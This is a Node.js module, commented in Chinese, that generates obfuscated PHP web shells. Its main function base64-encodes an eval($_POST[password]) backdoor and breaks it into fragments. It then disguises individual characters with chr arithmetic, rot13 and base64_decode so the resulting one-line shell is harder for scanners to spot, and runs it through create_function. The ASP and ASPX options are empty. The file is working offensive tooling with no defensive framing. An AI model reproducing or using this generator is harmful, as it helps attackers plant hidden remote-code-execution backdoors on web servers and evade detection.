/**
 * 核心模块
 */

class Core {
  constructor(argv) {
    let self = this;
    return new Promise((res, rej) => {
      switch (argv.type){
        case "php":
          res(self._gen_php(argv.pwd));
          break;
        case "asp":
          break;
        case "aspx":
          break;
        default:
          break;
      }
    })
  }

  // 生成 php shell
  _gen_php(pwd){
    let self = this;
    let rnd = self._randint(1,1000000);
    let cmd = new Buffer(`${rnd};@evAl($_POST[${pwd}]);${rnd*3};`).toString('base64');
    let sli = [];
    for(var i=0; i < cmd.length/5 + 1; i++){
      sli.push(cmd.slice(i*5,i*5+5));
    }
    let tmp = [];
    sli[4].split('').forEach((c,_,arr)=>{
      tmp.push(self._php_encode_char(c,self._randint(1,4)));
    });
    sli[4] = `'.${tmp.join(".")}.'`;
    tmp = [];
    sli[5].split('').forEach((c,_,arr)=>{
      tmp.push(self._php_encode_char(c,self._randint(1,4)));
    });
    sli[5] = `'.${tmp.join(".")}.'`;
    cmd = sli.join("'.'");

    tmp = [];
    '$some'.split('').forEach((c,_,arr)=>{
      tmp.push(self._php_encode_char(c,self._randint(1,4)));
    });
    let para = tmp.join('.');
    tmp = [];
    'eval($some);'.split('').forEach((c,_,arr)=>{
      tmp.push(self._php_encode_char(c,self._randint(1,4)));
    });
    let func = tmp.join('.');
    let func_name = self._randomStr(4);
    let php_line=`<?php \$${func_name}=create_function(${para},${func});\$${func_name}(base64_decode('${cmd}'));?>`;
    return php_line;
  }

  /*
  * php 随机对字符进行转换
  */
  _php_encode_char(c, rnd){
    let self = this;
    rnd = rnd || 1
    switch(rnd){
    case 0:
      return `'${c}'`;
    case 1:
      return `base64_decode('${new Buffer(c).toString('base64')}')`;
    case 2:
      var n = self._randint(200,1000);
      switch(n%3){
      case 0:
        return `chr(${n}-${n-(c.charCodeAt())})`;
      case 1:
        return `chr(0x${n.toString(16)}-0x${(n-c.charCodeAt()).toString(16)})`;
      case 2:
        return `chr(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
      }
    case 3:
      return `str_rot13('${self._rot13(c)}')`;
    case 4:
      var n = self._randint(200,1000)
      switch(n%3){
        case 0:
          return `chr(${n*c.charCodeAt()}/${n})`;
        case 1:
          return `chr(0x${(n*c.charCodeAt()).toString(16)}/0x${n.toString(16)})`;
        case 2:
          return `chr(0${(n*c.charCodeAt()).toString(8)}/0${n.toString(8)})`;
      }
    }
  }

  _rot13(s){
    //use a Regular Expression to Replace only the characters that are a-z or A-Z
    return s.replace(/[a-zA-Z]/g, function (c) {
        //Get the character code of the current character and add 13 to it
        //If it is larger than z's character code then subtract 26 to support wrap around.
        return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
    });
  }
  _randint(n, m){
    return Math.floor(Math.random()*(m-n+1)+n);
  }
  // 随机产生指定长度字符串
  _randomStr(len){
    len = len || 8;
    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let maxPos = chars.length;
    let pwd = '';
    for (var i = 0; i < len; i++) {
      pwd += chars.charAt(Math.floor(Math.random() * maxPos));
    }
    return pwd;
  }
}
  
module.exports = Core;
